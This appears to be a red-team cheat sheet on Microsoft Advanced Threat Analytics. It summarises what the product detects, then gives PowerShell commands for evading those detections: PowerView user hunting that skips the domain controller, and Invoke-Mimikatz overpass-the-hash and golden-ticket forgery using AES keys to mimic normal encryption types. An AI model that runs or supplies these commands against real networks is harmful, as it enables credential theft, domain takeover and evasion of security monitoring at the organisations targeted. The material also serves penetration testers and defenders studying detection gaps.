# Microsoft ATA (Advanced Threat Analytics).
---
## What's ATA?
**Advanced Threat Analytics** (ATA) is an on-premises platform that helps protect your enterprise from multiple types of advanced targeted cyber attacks and insider threats.
- Traffic destined for Domain Controllers is mirrored to ATA sensors and a user activity profile is build over time - use of computers,Credentials,log on machines ..etc
- Collects Event `4776` (The DC attempted to validate the credentials for an account) to detect credential replay attacks.
- Can detect behavior anomalies.
## Useful for detecting 
- **Recon**: Account enum, Netsession enum.
- **Compromised Credentials Attacks**: Brute-Force, High privilege account/service account exposed in clear text, Honey token, unusual protocol (NTLM and kerberos).
- Credential/Hash/Ticket Replay attacks.

## Bypass user hunting detection
To bypass `Reconnaissance using SMB session enumeration` make sure to exclude the Domain Controller from the enumeration.
```powershell
#Get list of computers
Get-NetComputer
```

```powershell
#Enumerate Users (Powerview module)
Invoke-UserHunter -ComputerFile <ListOfComputersWithoutDC>
```
## Bypass Overpass-the-hash detection
We need to make the encryption type as the one normally used.
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<User> /domain:<Domain> /aes256:<aes256> /ntlm:<NTLM> /aes128:<aes128>"'
```
> 1. Putting all `AES256`,`AES128`,`NTLM(RC4)` together reduces chances of detection.
> 2. AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with KB2871997, in this case you can avoid NTLM hash.

## Bypass Golden ticket detection
We need to make the encryption type as the one normally used.
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:<User> /domain:<Domain> /sid:<SID> /aes256:<aes256keysofkrbtgt> /id:500 /groups:513 /ptt"'
```
> A Golden ticket using AES keys can be generated from any machine unlike restrictions in case of Over-PTH.
